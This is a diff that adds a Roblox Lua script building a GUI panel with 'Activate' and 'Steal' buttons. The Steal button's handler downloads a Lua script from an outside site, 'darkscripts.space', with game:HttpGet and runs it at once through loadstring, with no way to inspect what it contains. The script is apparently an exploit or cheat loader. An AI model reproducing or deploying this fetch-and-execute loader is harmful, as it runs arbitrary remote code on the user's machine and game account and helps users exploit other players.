@@ -1,0 +1,111 @@
+-- Services
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "CustomGui"
+screenGui.Parent = playerGui
+screenGui.ResetOnSpawn = true -- Reset GUI on respawn
+
+-- Create Frame
+local frame = Instance.new("Frame")
+frame.Name = "MainFrame"
+frame.Parent = screenGui
+frame.Size = UDim2.new(0.5, 0, 0.3, 0) -- 50% width, 30% height
+frame.Position = UDim2.new(0.5, 0, 0.5, 0) -- Centered
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.BackgroundColor3 = Color3.fromRGB(192, 192, 192) -- Light gray
+frame.BackgroundTransparency = 0.2
+frame.BorderSizePixel = 0
+frame.Visible = true
+frame.ClipsDescendants = true
+
+-- Add UICorner for rounded edges
+local frameCorner = Instance.new("UICorner")
+frameCorner.CornerRadius = UDim.new(0.1, 0) -- Round corners
+frameCorner.Parent = frame
+
+-- Add Label
+local label = Instance.new("TextLabel")
+label.Parent = frame
+label.Size = UDim2.new(1, 0, 0.2, 0)
+label.Position = UDim2.new(0, 0, 0.1, 0)
+label.Text = "After click activate,\nclick STEAL"
+label.Font = Enum.Font.SourceSansBold
+label.TextSize = 20
+label.TextColor3 = Color3.fromRGB(0, 0, 0)
+label.BackgroundTransparency = 1
+
+-- Create Close/Open Button (Toggle Switch)
+local toggleButton = Instance.new("TextButton")
+toggleButton.Name = "ToggleButton"
+toggleButton.Parent = frame
+toggleButton.Size = UDim2.new(0.15, 0, 0.15, 0)
+toggleButton.Position = UDim2.new(0.9, -10, 0.05, 0)
+toggleButton.AnchorPoint = Vector2.new(1, 0)
+toggleButton.Text = ""
+toggleButton.BackgroundColor3 = Color3.fromRGB(255, 85, 85) -- Red toggle
+toggleButton.BorderSizePixel = 0
+
+-- Add UICorner to the Toggle Button
+local toggleCorner = Instance.new("UICorner")
+toggleCorner.CornerRadius = UDim.new(1, 0) -- Fully rounded
+toggleCorner.Parent = toggleButton
+
+-- Create Activate Button
+local activateButton = Instance.new("TextButton")
+activateButton.Name = "ActivateButton"
+activateButton.Parent = frame
+activateButton.Size = UDim2.new(0.6, 0, 0.15, 0)
+activateButton.Position = UDim2.new(0.2, 0, 0.4, 0)
+activateButton.Text = "Activate"
+activateButton.Font = Enum.Font.SourceSansBold
+activateButton.TextSize = 24
+activateButton.TextColor3 = Color3.fromRGB(255, 0, 0) -- Red text
+activateButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black button
+
+-- Add UICorner to the Activate Button
+local activateCorner = Instance.new("UICorner")
+activateCorner.CornerRadius = UDim.new(0.2, 0)
+activateCorner.Parent = activateButton
+
+-- Create Steal Button
+local stealButton = Instance.new("TextButton")
+stealButton.Name = "StealButton"
+stealButton.Parent = frame
+stealButton.Size = UDim2.new(0.6, 0, 0.15, 0)
+stealButton.Position = UDim2.new(0.2, 0, 0.6, 0)
+stealButton.Text = "Steal"
+stealButton.Font = Enum.Font.SourceSansBold
+stealButton.TextSize = 24
+stealButton.TextColor3 = Color3.fromRGB(0, 255, 0) -- Green text
+stealButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black button
+
+-- Add UICorner to the Steal Button
+local stealCorner = Instance.new("UICorner")
+stealCorner.CornerRadius = UDim.new(0.2, 0)
+stealCorner.Parent = stealButton
+
+-- Button Functionality
+toggleButton.MouseButton1Click:Connect(function()
+    frame.Visible = not frame.Visible
+end)
+
+activateButton.MouseButton1Click:Connect(function()
+    print("Activate button clicked!")
+end)
+
+stealButton.MouseButton1Click:Connect(function()
+    print("Attempting to execute the 'Steal' script...")
+    local success, err = pcall(function()
+        -- Ensure the URL is accessible and valid
+        loadstring(game:HttpGet('https://darkscripts.space/scripts/ff98e581-cc8c-4ea4-b437-2dc6d5a9f639_842196516693475329.lua',true))()
+    end)
+    if success then
+        print("'Steal' script executed successfully!")
+    else
+        warn("Failed to execute 'Steal' script: " .. tostring(err))
+    end
+end)
